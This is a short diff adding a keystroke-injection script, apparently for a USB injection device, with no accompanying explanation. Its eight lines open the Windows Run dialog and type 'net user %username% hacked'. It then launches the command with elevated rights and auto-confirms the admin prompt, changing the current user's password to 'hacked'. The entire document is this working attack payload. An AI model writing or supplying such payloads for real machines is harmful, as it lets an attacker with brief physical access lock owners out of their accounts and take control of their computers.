@@ -1,0 +1,8 @@
+DELAY 750
+GUI r
+DELAY 500
+STRING net user %username% hacked
+DELAY 250
+CTRL SHIFT ENTER
+DELAY 700
+ALT Y
